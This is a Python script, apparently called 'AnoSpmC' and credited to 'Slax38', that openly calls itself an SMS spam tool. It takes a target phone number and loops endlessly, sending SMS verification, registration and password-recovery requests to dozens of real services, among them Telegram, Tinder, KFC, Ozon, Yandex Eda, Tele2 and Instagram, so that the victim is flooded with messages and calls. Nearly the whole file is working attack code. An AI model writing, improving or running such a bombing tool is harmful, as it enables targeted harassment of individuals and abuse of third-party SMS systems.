#!/bin/usr/python3

# Author: Slax38

import os, time, requests, json, sys
import getopt
import re
import argparse
import subprocess
import uuid
from requests import post
import webbrowser
from getch import pause
from tkinter import Tk, filedialog
import random

options = "h:n:t:"

print()
print("AnoSpmC v1.0.0 Short Message Service Spam Tool, Slax38")
print()
print("Arguments:")
print("-h, --helpanel")
print("-n, --number Ej: +34658xxxxx")
print("-t, --timeSpam Ej: 30")
print()
print("Example: anospmc.py -n +34658xxxxx -t 30")

def helPanel():
   print()
   print("AnoSpmC v1.0.0 Short Message Service Spam Tool, Slax38")
   print()
   print("Arguments:")
   print("-h, --helpanel")
   print("-n, --number Ej: +34658xxxxx")
   print("-t, --timeSpam Ej: 30")
   print()
   print("Example: anospmc.py -n +34658xxxxx -t 30")

def sig():
   f = input("[i] the spam has finished do you want to do it again? (y/n): ")
   if f == "y":
      print()
      attackNumber()
   if f == "n":
      print()
      print("[i] Exiting AnoSpmC")
      sys.exit
   else:
       print("[!] Invalid response")
       sig()

def Check_internet_connection(phone):
    url = "https://www.google.com"
    try:
        requests.get(url, timeout=1)
        time.sleep(0.10)
    except requests.ConnectionError:
        print("[!] No internet connection Trying...")
        Check_internet_connection(phone)

   
def attackNumber3(phone):
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7'+phone[1:]
    if phone[0] == '9':
        phone = '7'+phone

    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]

    iteration = 0
    time.sleep(0.75)
    print("[+] Sending spam")

    email = _name+f'{iteration}'+'@gmail.com'
    try:
        requests.post('https://my.telegram.org/auth/send_password', data={'phone':'+{phone}'})
        print("[+] Sending spam")
    except:
        print("[+] Sending spam")

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        print("[+] Sending spam")
    except:
        print("[+] Sending spam")

    try:
        requests.post('https://www.rabota.ru/remind', data={'phone_number': phone}, headers={})
        print("[+] Sending spam")
    except:
        print("[+] Sendin spam")
   

def attackNumber2(phone, timeSpam):
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    ua = {
        "Host": "api.myfave.com",
        "Connection": "keep-alive",
        "x-user-agent": "Fave-PWA/v1.0.0",
        "User-Agent": "Mozilla/5.0 (Linux: Android 10; SM-A107F) Applewebkit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://m.myfave.com",
        "Referer": "https://m.myfave.com/jakarta/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    id = 0
    for i in range(1,5):
        dat = {"phone":phone}
        r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
        id +=1
        if "6c047709f9da4291a568fa84b97b6d47" in r:
            print ("[!] Trying to send calls ")
        else:
            print ("[!] Trying to send calls ")
        time.sleep(int(timeSpam))

def api():
   print("[i] Sometimes the api malfunctions wait 30 seconds")
   time.sleep(30)


def attackNumber(phone):
   print()
   print()
   print("AnoSpmC v1.0.0 Short Message Service Spam Tool, Slax38")
   print()
   print("[+] Connecting", phone, "to the api")
   time.sleep(2.4)
   
   if phone[0] == '+':
        phone = phone[1:]
   if phone[0] == '8':
        phone = '7'+phone[1:]
   if phone[0] == '9':
        phone = '7'+phone

   _name = ''
   for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

   phone9 = phone[1:]
   phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]

   iteration = 0
   print("[i] Stop spam CTRL+Z")
   time.sleep(0.75)
   Check_internet_connection(phone)
   print("[+] Sending spam")
   while True:
        email = _name+f'{iteration}'+'@gmail.com'
        try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:

                requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://app-api.kfc.ru/api/v2/common/auth/send-validation-sms', json={'phone': '+' + phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")


        try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': phone, 'recaptcha_challenge_field':''})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")

        try:
                requests.post('https://vladikavkaz.edostav.ru/site/CheckAuthLogin', data={"phone_or_email":phone}, headers={"Host": "vladikavkaz.edostav.ru",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "26"})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={"phone":phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +phone, "action": "confirm_mobile"})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://msk.tele2.ru/api/validation/number/" +phone,json={"sender": "Tele2"})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +phone})
                print("[+] Sending spam")
        except:
                print("[+] Sending spam")
        try:
                iteration +=1
                attackNumber2(phone, timeSpam)
                api()
                attackNumber3(phone)
        except:
                break
try:
  opts, args = getopt.getopt(sys.argv[1:], options)
except getopt.GetoptError:
  sys.exit(2)

phone = None
timeSpam = None

for opt, arg in opts:
  if opt == "-h":
    helPanel()
  elif opt == "-n":
    phone = arg
  elif opt == "-t":
    timeSpam = arg
if phone and timeSpam is not None:
  attackNumber(phone)
